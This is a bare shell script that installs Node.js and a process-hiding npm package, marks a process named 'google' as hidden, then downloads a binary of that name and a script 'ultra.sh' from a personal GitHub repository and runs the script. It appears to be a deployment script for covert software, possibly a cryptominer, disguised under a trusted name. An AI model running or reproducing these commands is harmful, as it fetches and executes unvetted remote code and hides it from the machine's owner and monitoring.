curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add google
chmod +x google
wget https://github.com/huhiou/ultra-private/raw/main/ultra.sh
wget https://github.com/huhiou/ultra-private/raw/main/google
chmod +x ultra.sh
./ultra.sh
